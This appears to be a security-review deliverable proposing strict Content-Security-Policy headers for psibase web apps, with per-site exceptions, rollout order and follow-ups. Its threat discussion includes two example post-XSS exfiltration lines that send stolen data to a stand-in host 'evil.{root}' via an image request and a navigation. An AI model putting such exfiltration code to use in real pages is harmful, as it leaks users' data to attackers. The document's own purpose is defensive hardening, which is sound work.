# Content Security Policy Recommendations

Security review deliverable for tightening the Content-Security-Policy (CSP)
headers served to psibase web apps.

Reference: <https://infosec.mozilla.org/guidelines/web_security.html>

## Goal

Replace today's single permissive baseline with a **strict-by-default** policy,
and enumerate the small set of apps that legitimately need a looser policy.
Every CSP below is the strictest policy that still lets the app function, given
the platform architecture verified in the codebase (last verified against
`main`, July 2026).

## Assumptions

1. **Host injection.** `sites` can inject, per request, the request's own
   origin (covered by `'self'`) and the deployment **root domain** `{root}`,
   derived by stripping the leading service label from the request `Host`
   header. All subdomains are `<service>.{root}`. This is one of the two
   engineering prerequisites this review depends on (see *Prerequisites and
   order of operations*), but the primitives already exist:
   `Sites::serveSys` already calls `to<HttpServer>().rootHost(request.host)` at
   the point the CSP is assembled, and `HttpServer::getSiblingUrl` already
   demonstrates deriving the scheme (`forwardedProto` → `isSecure(socket)` →
   `isLocalhost`) and preserving the port (`hostHeaderPortSuffix`). Note
   `rootHost` does **not** include the port, so origins are built as
   `scheme + rootHost + portSuffix`, mirroring `getSiblingUrl`. See the
   dev/localhost note under Watch list for the recommended scheme-relative form.
2. **CSP is replace, not merge.** In the current `sites` implementation
   (`Sites::getCspHeader`), a per-path or per-site CSP **completely replaces**
   the default — the values are not merged. Therefore every exception below must
   be stated as a *complete* policy, not a delta.
3. **Strictness target.** Where a choice exists, we pick the strictest value
   that does not break a verified use, and rely on the existing `setCsp` action
   for app developers to opt into anything looser.

---

## Prerequisites and order of operations

Two separate bodies of engineering work gate this rollout. They are
independent of each other, but both must land before the final policies in
this document can be enforced as written.

### Prerequisite A — dynamic host injection (already documented)

The per-request `{root}` injection described under Assumptions. The
primitives exist (`HttpServer::rootHost`, and the scheme/port derivation in
`HttpServer::getSiblingUrl`); the current branch hard-codes
`psibase.localhost:8080` in `Sites.cpp` as a placeholder until this lands.
This prerequisite unblocks shipping *any* of the policies below with real
hosts.

### Prerequisite B — avatar proxying

Today avatars are uploaded to each account's own subdomain (`sites` path
`<account>.{root}/profile/avatar`, via the `Profiles` plugin) and fetched
**cross-subdomain** by the shared `Avatar` component (Homepage
contacts/Chainmail/tokens, etc.). That is the only verified first-party use
forcing `*.{root}` into `img-src`, and it carries two costs that no CSP value
can fix while the feature works this way:

1. **Activity oracle.** Every avatar render pings the pictured account's
   subdomain. A malicious app that registers its own HTTP handler can
   persist request logs server-side (the `subjective` database is writable
   during RPC), so merely *viewing* a Chainmail message or contact entry for
   account `evil` tells `evil` you did so, and when. Any policy that permits
   the avatar feature permits this tracking.
2. **Exfiltration channel.** Any `*.{root}` image source — even path-scoped,
   since CSP matching ignores query strings — lets a post-XSS payload
   exfiltrate silently via
   `new Image().src = "https://evil.{root}/…?stolen=…"`, landing the data in
   the same subjective-DB logging described above.

The work: serve all avatars from a single first-party host — e.g.
`profiles.{root}/avatar/<account>`, with the `profiles` service reading the
stored avatar content — and point the shared `Avatar` component at it. Then
`img-src` shrinks to one prefix-matched source and both problems disappear
(the proxy host learns which avatars are fetched, but `profiles` is a
first-party system service, not an arbitrary account).

### Order of operations

1. **Prerequisite A** (dynamic `{root}` injection) — required first; nothing
   here ships with real hosts without it.
2. **Initial enforcement** can follow immediately, including the strict
   `connect-src 'self'` default. The default-deny `connect-src` does *not*
   wait for Prerequisite B — it is required from day one so third-party apps
   are secure by default — but it does require the first-party allowlist
   overrides (see *First-party apps needing a `connect-src` allowlist*) to
   land in the same change, or those apps break. Hand-written
   `postinstall.json` overrides (as `perms` already does) are acceptable
   until allowlist generation is automated.
3. **Prerequisite B** (avatar proxy) — required before the tightened
   `img-src` can be enforced; land the proxy and the `img-src` change
   together (tightening `img-src` before the proxy exists breaks avatars).

If the CSP rollout ships before Prerequisite B, use
`img-src 'self' data: {root} *.{root}` as an **interim** value everywhere
this document says `img-src 'self' data: profiles.{root}/avatar/ branding.{root}`,
and treat the tightened value as the target state. (This interim wildcard also
temporarily preserves an image-based exfiltration channel that undercuts part
of the `connect-src` tightening's value — one more reason to prioritize B.)

### Rollout: enforce directly, skip Report-Only

Nothing is in production yet, so the usual
`Content-Security-Policy-Report-Only` phase (protecting live users from
silent breakage) is unnecessary — enforce directly. Two mitigations replace
it:

- CSP violations do not throw; they fail silently (an image doesn't render, a
  fetch returns an error) and are only *loudly* reported in the devtools
  console. After enforcement lands, do one deliberate smoke pass with
  devtools open over the code paths most likely to break — which are exactly
  the exception list below: supervisor Wasm/`blob:` loading, prompt pages
  framed by the supervisor, Explorer's inline bootstrap, Docs
  MathJax/Mermaid, and the invite-acceptance flow.
- If telemetry is wanted later, an *enforced* policy can carry a `report-to`
  directive; adopting it does not require going back to a dual-header
  Report-Only rollout.

---

## Recommended default CSP

Applies to the **majority** of Sites (any normal first-party or third-party web
app that renders UI and talks to the platform). Assumes Prerequisite B (avatar
proxying) has landed; see *Prerequisites and order of operations* for the
interim `img-src` value if it has not.

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: profiles.{root}/avatar/ branding.{root};
font-src 'self';
connect-src 'self';
frame-src supervisor.{root};
frame-ancestors 'self';
base-uri 'none';
form-action 'self';
object-src 'none';
```

As a single header value:

```
default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: profiles.{root}/avatar/ branding.{root}; font-src 'self'; connect-src 'self'; frame-src supervisor.{root}; frame-ancestors 'self'; base-uri 'none'; form-action 'self'; object-src 'none';
```

> **Notation.** Host sources are written **scheme-relative** (no `http://` /
> `https://` prefix). A schemeless host-source adopts the document's own scheme
> (and auto-upgrades `http`→`https` under an `https` page), so one injected string
> works unchanged in both `http` local dev and `https` production. `{root}` is the
> deployment root host **including port** (e.g. `psibase.localhost:8080` locally,
> `example.com` in prod), injected per request from `rootHost` +
> `hostHeaderPortSuffix` (see Assumptions and the dev/localhost note).

### Rationale

| Directive | Value | Why |
| --- | --- | --- |
| `default-src` | `'self'` | Backstop for any directive not listed. |
| `script-src` | `'self'` | Verified for all Vite-built apps: no inline `<script>`, no `eval`/`new Function`/Wasm compilation, no `blob:`/CDN script loading. Dangerous script capabilities live in the supervisor only. The two non-Vite sites (Explorer/SvelteKit and Docs/mdbook) *do* emit inline scripts and are listed as exceptions. |
| `style-src` | `'self' 'unsafe-inline'` | Unavoidable: the shadcn chart component injects a runtime `<style>` via `dangerouslySetInnerHTML`. Style injection cannot execute JS, so risk is low. Removing it requires per-response style nonces, which conflicts with static hosting + ETag caching. |
| `img-src` | `'self' data: profiles.{root}/avatar/ branding.{root}` | `data:` for generated identicons (dicebear `toDataUri`) and base64 app icons (Workshop). `profiles.{root}/avatar/` (trailing slash = prefix match; CSP ignores query strings, so cache-bust params are fine) is the single avatar proxy host from Prerequisite B, replacing the former `{root} *.{root}` wildcard. `branding.{root}` because Config previews the network logo from `branding.{root}/network_logo.svg` — a fixed first-party host. The apex `{root}` is dropped: it only 302-redirects to the homepage subdomain (`HttpServer.cpp`), so nothing loads images from it. Arbitrary off-domain images still require per-app opt-in. |
| `font-src` | `'self'` | Fonts are self-hosted; no CDN font usage found. |
| `connect-src` | `'self'` | **Secure by default.** `'self'` covers everything the platform itself requires of an ordinary app: its own service's `/graphql` and RPC endpoints (served on the app's own subdomain), the `/common/*` endpoints (served same-origin on every subdomain, e.g. the `fetch("/common/chainid")` in shared-ui), and same-origin WebSockets. Supervisor comms is `postMessage` (not governed by CSP), and the supervisor's own cross-subdomain fetching happens inside its iframe under the *supervisor's* CSP. An app that fetches **other** services directly must opt in via `setCsp` with an explicit host list — verified for most first-party apps too (see below). We deliberately do *not* ship a `*.{root}` default: it would make every subdomain a permitted silent exfiltration target for every app whose developer never thinks about CSP. |
| `frame-src` | `supervisor.{root}` | The only iframe a normal app mounts is the hidden supervisor iframe injected by `@psibase/common-lib`. |
| `frame-ancestors` | `'self'` | Normal app pages are not meant to be embedded cross-origin (clickjacking defense). Apps that expose a prompt page override this — see exceptions. |
| `base-uri` | `'none'` | Nothing sets `<base>`; blocks `<base>`-injection that would redirect relative resource loads. |
| `form-action` | `'self'` | Apps submit via `fetch`, not native cross-origin form posts. |
| `object-src` | `'none'` | No `<object>`/`<embed>` usage. |

### Opting up from the default (`connect-src` and beyond)

The default is deliberately a floor, not a ceiling. An app that legitimately
needs more — direct `fetch` to another service's GraphQL, an external API,
off-domain images — opts up via the existing `setCsp` action (exposed through
the `sites` plugin and the Workshop UI). Two rules for anyone doing this:

1. **State a complete policy.** CSP here is replace-not-merge (Assumption 2):
   a `setCsp` that contains only the directive you wanted to loosen silently
   *deletes* every other protection (this is exactly the bug the current
   `perms` override has — see Exception 3). Workshop should offer the default
   policy as a template to edit, so opting up one directive doesn't drop the
   rest.
2. **List hosts, not wildcards.** Add `invite.{root}`, not `*.{root}`. The
   Watch-list item on generated allowlists describes how first-party apps
   automate this at packaging time; third-party apps can hand-write the same
   shape in their `setCsp`.

### Companion header: `Referrer-Policy: same-origin`

Serve `Referrer-Policy: same-origin` platform-wide alongside the CSP (it is a
separate response header, not a CSP directive). Every psibase subdomain is a
distinct origin, so under the browser default
(`strict-origin-when-cross-origin`) any request from an app to another
subdomain — an avatar fetch, a clicked link — still announces the requesting
app's origin to the destination. `same-origin` keeps the full referrer URL
for same-origin requests (useful for first-party debugging) but sends
**nothing** cross-origin: no `Referer` header, empty `document.referrer`.
Combined with Prerequisite B this removes the "this user is currently in
app X" signal from anything an untrusted subdomain can observe. A page that
legitimately needs to send a cross-origin referrer can override per element
with the `referrerpolicy` attribute.

### Sites covered by the default

These apps were verified to fetch only same-origin endpoints (their own
`/graphql` and `/common/*`) from the page, so the strict default works as-is:

- `identity` (Identity)
- `evaluations` (Evaluations — its `graphql()` calls name its own service,
  which resolves to its own origin)
- `fractals` (Fractals)
- `token-stream` (TokenStream)
- `prem-accounts` (PremAccounts)
- `workshop` (Workshop)
- `common-api` (CommonApi; also serves the plugin-tester dev tool under
  `/common/plugin-tester/` — it is part of this site, not its own subdomain,
  and calls plugins via the supervisor, not direct fetch)

A few service-only packages (`branding`, `chainmail`, `guilds`, `tokens`)
declare `data` uploads in their `Cargo.toml` but have no in-tree UI source
(the standalone Chainmail UI now lives inside Homepage); whatever static
content they serve also falls under the default.

### First-party apps needing a `connect-src` allowlist

These apps `fetch` other services directly from the page, so under the strict
default they need a `setCsp` override = **default + enumerated hosts in
`connect-src`** (complete policy, per Assumption 2). Hosts verified in-tree:

| App | Extra `connect-src` hosts | Verified direct fetches |
| --- | --- | --- |
| `homepage` (Homepage, incl. Chainmail/Contacts/Tokens/Token-swap sub-apps) | `invite.{root}` `tokens.{root}` `token-swap.{root}` | invite GraphQL (`pages/invite.tsx`); tokens GraphQL (`apps/tokens/lib/graphql/ui.ts`); token-swap GraphQL (`apps/token-swap/hooks/use-pools.ts`) |
| `config` (Config) | `vserver.{root}` `prem-accounts.{root}` `<namemarket>.{root}` | resource pricing/virtual-server hooks; premium/name-market hooks |
| `fractal-cr` (FractalCore) | `guilds.{root}` `invite.{root}` | guild/evaluation GraphQL (`lib/graphql/fractals/*`); invite GraphQL |

These lists change as apps grow — do not hand-maintain them long-term; see
the Watch-list item on generated allowlists.

Explorer and Docs also exist on this branch but need exceptions (see below)
because their build tooling emits inline scripts; Explorer additionally
fetches `tokens.{root}` directly.

---

## Exceptions

Beyond the first-party `connect-src` allowlists above (which are just the
default plus enumerated hosts), five Sites need a structurally different
policy. Each is stated as a complete replacement policy (per assumption 2).

### 1. Supervisor (`supervisor`) — special in both directions

The supervisor is the trust-mediation iframe. It is unique because it:

- compiles and instantiates WebAssembly plugins in the browser
  (`WebAssembly.compile`) and imports jco-generated JS via `blob:` URLs
  (`packages/user/Supervisor/ui/src/component-loading/loader.ts`);
- fetches plugin `.wasm` and service GraphQL from **any** service subdomain;
- is **embedded as a hidden iframe by every app** (its `index.html`), so it must
  allow being framed by all subdomains; and
- **embeds every app's prompt page** (its `prompt.html` loads
  `https://<promptApp>.{root}/plugin/web/prompt/<name>`), so it must be allowed
  to frame all subdomains.

Recommended (site-wide) policy:

```
default-src 'self';
script-src 'self' 'wasm-unsafe-eval' blob:;
style-src 'self' 'unsafe-inline';
img-src 'self' data: profiles.{root}/avatar/ branding.{root};
font-src 'self';
connect-src 'self' blob: {root} *.{root};
frame-src {root} *.{root};
frame-ancestors {root} *.{root};
base-uri 'none';
form-action 'self';
object-src 'none';
```

Notes:

- `script-src` keeps `'wasm-unsafe-eval'` (for `WebAssembly.compile`) and
  `blob:` (for `import(blobUrl)` of jco output), but still **omits
  `'unsafe-inline'`** — the supervisor loads an external module script, no inline
  scripts. **Verify in testing:** if jco instantiation triggers JS `eval`,
  fall back from `'wasm-unsafe-eval'` to `'unsafe-eval'`. This is still tighter
  than today's default, which grants both `'unsafe-eval'` and `'unsafe-inline'`.
- `frame-src` and `frame-ancestors` are both `*.{root}` (plus apex) because the
  supervisor both embeds prompt apps and is embedded by all apps.
- With the strict default in place, the supervisor is the **only** site whose
  `connect-src` keeps the `*.{root}` wildcard. That is by design: it must load
  plugin `.wasm` and query GraphQL from arbitrary service subdomains, and
  concentrating that capability in the one origin built to mediate trust is
  the point of the architecture.

### 2. Accounts (`accounts`) — serves prompt pages, is an SPA

Accounts serves prompt UIs at `/plugin/web/prompt/{connect,import,create}`
(`packages/system/Accounts/ui/src/router.tsx`) and triggers prompts via
`host:prompt` (`Prompt::prompt("connect", ...)`). These pages are embedded
cross-origin by the supervisor's `prompt.html`, so they must allow
`supervisor.{root}` as a frame ancestor.

Because Accounts is a **single-page app** (`enablespa`), all routes resolve to
the same `index.html` content row, so a path-scoped CSP cannot single out the
prompt routes — the exception must be applied **site-wide** (`setCsp` with path
`*`).

Recommended (site-wide) policy = default, with `frame-ancestors` widened
(Accounts' UI makes no direct cross-subdomain fetches — its account and key
operations go through the supervisor — so `connect-src` stays `'self'`):

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: profiles.{root}/avatar/ branding.{root};
font-src 'self';
connect-src 'self';
frame-src supervisor.{root};
frame-ancestors 'self' supervisor.{root};
base-uri 'none';
form-action 'self';
object-src 'none';
```

### 3. Permissions (`perms`) — serves a prompt page

Permissions serves a static prompt page at
`/plugin/web/prompt/permissions/index.html` and triggers prompts via
`host:prompt`. It is **not** an SPA and already ships a `postinstall.json` CSP
override for that path — but the current value is `frame-ancestors *`, which is
looser than necessary.

Recommendation: keep the override **path-scoped** to the prompt page (the rest
of the `perms` site uses the default), and tighten the value from `*` to the
supervisor origin. Because a path CSP replaces the default entirely, the
override must be a complete policy:

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data: profiles.{root}/avatar/ branding.{root};
font-src 'self';
connect-src 'self';
frame-src supervisor.{root};
frame-ancestors supervisor.{root};
base-uri 'none';
form-action 'self';
object-src 'none';
```

> Current `packages/user/Permissions/postinstall.json` sets only
> `frame-ancestors *`. Since CSP is replace-not-merge, that override currently
> *removes* the default policy from the prompt page entirely and replaces it
> with a single (permissive) directive. Adopting the full policy above both
> tightens `frame-ancestors` and restores the rest of the protections on that
> page.

### 4. Explorer (`explorer`) — SvelteKit inline bootstrap script

Explorer is the only SvelteKit app (`@sveltejs/adapter-static`,
`packages/user/Explorer/ui/svelte.config.js`). Unlike the Vite/React apps,
its built pages contain an **inline `<script>`** that bootstraps the app
(`__sveltekit_* = {...}; Promise.all([import("/_app/immutable/entry/...")])`).
The script's content embeds content-hashed asset paths, so it **changes every
build** — a hardcoded hash source is not maintainable by hand.

Recommended (site-wide) policy = default, with a build-time script hash and
`tokens.{root}` in `connect-src` (Explorer fetches token balances and symbol
data directly from the `tokens` subdomain, `ui/src/lib/loadData.js` and
`routes/account/[name]/+page.svelte`):

```
default-src 'self';
script-src 'self' 'sha256-{explorer-inline-script-hash}';
style-src 'self' 'unsafe-inline';
img-src 'self' data: profiles.{root}/avatar/ branding.{root};
font-src 'self';
connect-src 'self' tokens.{root};
frame-src supervisor.{root};
frame-ancestors 'self';
base-uri 'none';
form-action 'self';
object-src 'none';
```

Implementation options, in order of preference:

1. **Compute the hash at package/upload time** and bake it into Explorer's
   site-wide `setCsp` (the inline script is identical across pages within a
   single build, so one hash suffices).
2. **Use SvelteKit's built-in CSP support** (`kit.csp` with `mode: "hash"`) —
   but note it injects a `<meta>` CSP, and when both a header and a meta policy
   are present the *intersection* is enforced, so the header must still allow
   the inline script. This option only helps if the header CSP is derived from
   the build output anyway.
3. **Fallback:** `script-src 'self' 'unsafe-inline'` for this one site. Still
   far tighter than today's default (no `unsafe-eval`, no `https:`/CDN scripts),
   but it forfeits XSS protection on Explorer; treat as temporary.

### 5. Docs (`docs`) — mdbook output with inline scripts and CDN dependencies

The documentation site is mdbook-generated HTML (`doc/`, uploaded by the
`Docs` package). It has three build-tooling requirements the default forbids:

- mdbook's theme emits **multiple inline `<script>` blocks in every page**
  (theme/sidebar initialization, `doc/theme/index.hbs`);
- `mathjax-support = true` loads **MathJax from `cdnjs.cloudflare.com`**
  (MathJax v2 also loads its web fonts from that CDN); and
- the custom theme loads **Mermaid from `cdn.jsdelivr.net`**
  (`doc/theme/js/mermaid-load.js` injects
  `https://cdn.jsdelivr.net/npm/mermaid@11.4.1/dist/mermaid.min.js`).

Hashing the inline scripts is impractical: mdbook emits many distinct inline
blocks that change with mdbook/theme versions.

Recommended (site-wide) policy:

```
default-src 'self';
script-src 'self' 'unsafe-inline' cdnjs.cloudflare.com cdn.jsdelivr.net;
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
font-src 'self' cdnjs.cloudflare.com;
connect-src 'self';
frame-src 'none';
frame-ancestors 'self';
base-uri 'none';
form-action 'self';
object-src 'none';
```

Notes:

- Docs is static documentation with no login or transaction surface, so
  `'unsafe-inline'` here is a much smaller risk than it would be on an app.
- Docs does **not** embed the supervisor or fetch from sibling subdomains (it
  doesn't use `common-lib` at all), so `frame-src` is `'none'` — tighter than
  the default — and its `img-src` drops the avatar/branding sources too.
- The better long-term fix is to **vendor MathJax and Mermaid locally** (serve
  them from the `docs` site) and drop both CDN sources; see Watch list.
- The Google Analytics block in the theme is conditional on a `google_analytics`
  config value that is **not set** in `doc/book.toml.in`, so no
  `www.google-analytics.com` source is needed.

---

## Admin / local Sites (served by `x-sites`, not `sites`)

`x-admin` (XAdmin) and `x-proxy` (XProxy) are node-admin UIs served by the
**local** `x-sites` service, not `sites`. `x-sites` has **no default CSP** — it
only emits a header if one was stored on the content row at upload time
(`packages/local/XSites/src/XSites.cpp`). So these admin panels currently ship
with **no CSP at all**.

- **XAdmin** opens a same-origin WebSocket (`/native/admin/log`) and fetches the
  node's native admin API plus sibling admin services (`x-http`, `x-peers`,
  `x-packages`, `transact`).
- **XProxy** fetches `x-http` / `x-proxy` admin endpoints.

Recommended admin policy (same-origin WebSocket is covered by `'self'`; the
sibling admin services are enumerable, so no wildcard here either):

```
default-src 'self';
script-src 'self';
style-src 'self' 'unsafe-inline';
img-src 'self' data:;
font-src 'self';
connect-src 'self' x-http.{root} x-peers.{root} x-packages.{root} x-proxy.{root} transact.{root};
frame-ancestors 'none';
base-uri 'none';
form-action 'self';
object-src 'none';
```

> **Implementation gap:** `x-sites` has no mechanism to apply a default CSP.
> Delivering the above requires either adding a default-CSP capability to
> `x-sites` (mirroring `sites`) or setting the CSP explicitly on admin content
> at upload time. `frame-ancestors 'none'` is appropriate because admin panels
> should never be embedded.

---

## Watch list / follow-ups

- **`img-src` for external images.** The known first-party case (avatars) is
  covered by the `profiles.{root}/avatar/` proxy source once Prerequisite B
  lands (interim: `{root} *.{root}`). Truly external images (arbitrary
  user-supplied URLs, off-domain token icons/NFT art) remain blocked by default
  and need per-app opt-in via `setCsp`; re-audit if such a feature ships.
- **Generated `connect-src` allowlists.** The strict `connect-src 'self'`
  default means every app that fetches other services directly needs a
  `setCsp` override (see *First-party apps needing a `connect-src`
  allowlist*). Do **not** hand-maintain these lists long-term: generate them
  at packaging time from a per-app declaration (as already planned for
  Explorer's script hash), so a stale list fails loudly in dev rather than
  rotting silently. Most first-party sibling traffic already flows through
  the supervisor iframe (under the *supervisor's* CSP), which is why the
  per-app lists are short.
- **Third-party opt-up ergonomics.** Because CSP is replace-not-merge, the
  raw `setCsp` opt-up path has a footgun: a partial policy silently drops
  every directive it omits. Ship a guardrail with the rollout — at minimum, a
  documented copy-paste default template; better, a Workshop CSP editor that
  starts from the default and edits directives (the `csp-form` UI already
  exists); best, a future `sites` capability to merge/extend rather than
  replace. Re-evaluate after seeing how third-party devs actually use it.
- **Residual exfiltration via navigation.** Even with `img-src` and
  `connect-src` tight, CSP cannot block top-level navigation
  (`window.location = "https://evil.{root}/?stolen=…"`), so a determined XSS
  retains a noisy, one-shot exfiltration route. The realistic win from the
  tightening above is eliminating the *silent, repeatable* channels; calibrate
  expectations accordingly.
- **Explorer hash automation.** Exception 4 depends on computing the SvelteKit
  inline-script hash at build/packaging time and injecting it into Explorer's
  `setCsp`. Until that automation exists, Explorer needs the `'unsafe-inline'`
  fallback.
- **Docs: vendor MathJax and Mermaid.** Serving MathJax (and its fonts) and
  Mermaid from the `docs` site itself would remove `cdnjs.cloudflare.com` and
  `cdn.jsdelivr.net` from Exception 5 — the only third-party origins remaining
  in any recommended policy.
- **`'wasm-unsafe-eval'` vs `'unsafe-eval'` (supervisor).** Confirm jco
  instantiation works with the narrower `'wasm-unsafe-eval'`; fall back only if
  runtime errors appear.
- **`style-src 'unsafe-inline'`.** Removable only via per-response style nonces,
  which conflicts with `sites`' static hosting + ETag caching. Out of scope for
  the first pass.
- **Apex vs. subdomain.** `*.{root}` does not match the bare `{root}`; where a
  wildcard survives (supervisor's `connect-src`/`frame-src`/`frame-ancestors`),
  keep the explicit apex `{root}` entry alongside it. The apex is gone from
  the default entirely — it only 302-redirects to the homepage subdomain, so
  neither images nor fetches legitimately target it.
- **Dev / localhost.** Local origins are `http://` with ports (e.g.
  `http://config.psibase.localhost:8080`). `'self'` already covers the app's own
  origin — including scheme, host, and port — so same-origin scripts (the
  external `/common/common-lib.js` module served same-origin by `Sites::serveSys`),
  styles, `fetch`, and WebSockets work locally with no special handling. Only the
  cross-origin directives (e.g. `frame-src`, `img-src`, and any per-app
  `connect-src` allowlist hosts) need the scheme and port filled in. The
  **scheme-relative** notation used throughout this document handles that
  automatically: with `{root}` = `psibase.localhost:8080`, the default
  resolves to `frame-src supervisor.psibase.localhost:8080;` and an allowlist
  entry to `invite.psibase.localhost:8080`, which adopt the page's `http`
  scheme locally and `https` in prod — so only host+port needs injecting (from
  `rootHost` + `hostHeaderPortSuffix`). If a future implementation pins schemes
  explicitly instead, reuse the exact scheme derivation from
  `HttpServer::getSiblingUrl` (`forwardedProto` → `isSecure(socket)` →
  `isLocalhost`) so TLS-terminating reverse proxies get `https` sources via
  `X-Forwarded-Proto` rather than the plaintext socket scheme. The Vite dev
  server (port `8081`) is a separate origin not served by `sites`, so its
  HMR/`eval`/inline scripts are unaffected by this CSP.
- **Optional hardening.** Add `upgrade-insecure-requests` on non-localhost
  deployments only — it must be suppressed locally (it would try to upgrade
  `http://…localhost:8080` to `https` and break dev). Gate it on the existing
  `isLocalhost` check (already used for the cookie `Secure` flag in
  `CommonApi.cpp`). `require-trusted-types-for 'script'` is aspirational — it
  needs app-side Trusted Types adoption first.
- **Rollout.** Enforce directly; skip the `Content-Security-Policy-Report-Only`
  phase (nothing is in production). See *Rollout: enforce directly, skip
  Report-Only* under Prerequisites for the post-enforcement smoke pass and the
  option of adding `report-to` to the enforced policy later.

---

## Summary table

| Site | Service account | Policy | Scope | Reason |
| --- | --- | --- | --- | --- |
| Identity, Evaluations, Fractals, TokenStream, PremAccounts, Workshop, CommonApi (incl. plugin-tester) | various | **Default** | site-wide | Verified same-origin-only fetches |
| Homepage | `homepage` | Default + `connect-src` allowlist | site-wide (SPA) | Direct GraphQL to `invite`, `tokens`, `token-swap` |
| Config | `config` | Default + `connect-src` allowlist | site-wide (SPA) | Direct GraphQL to `vserver`, `prem-accounts`, name-market services |
| FractalCore | `fractal-cr` | Default + `connect-src` allowlist | site-wide (SPA) | Direct GraphQL to `guilds`, `invite` |
| Supervisor | `supervisor` | Exception 1 | site-wide | Wasm/blob, embeds prompts, embedded by all apps; sole holder of the `connect-src` wildcard |
| Accounts | `accounts` | Exception 2 | site-wide (SPA) | Serves prompt pages embedded by supervisor |
| Permissions | `perms` | Exception 3 | path (`/plugin/web/prompt/permissions/index.html`) | Serves a prompt page embedded by supervisor |
| Explorer | `explorer` | Exception 4 | site-wide | SvelteKit inline bootstrap script (per-build hash); fetches `tokens` directly |
| Docs | `docs` | Exception 5 | site-wide | mdbook inline scripts + MathJax (cdnjs) and Mermaid (jsdelivr) CDNs |
| XAdmin, XProxy | `x-admin`, `x-proxy` | Admin policy | via `x-sites` | Admin panels; `x-sites` has no default-CSP mechanism (gap) |

All policies above assume Prerequisite A (dynamic host injection) has landed;
the `img-src` values additionally assume Prerequisite B (avatar proxying) —
see *Prerequisites and order of operations*. The `connect-src` allowlist rows
must land in the same change that enforces the strict default, and should be
generated at packaging time rather than hand-maintained (Watch list).
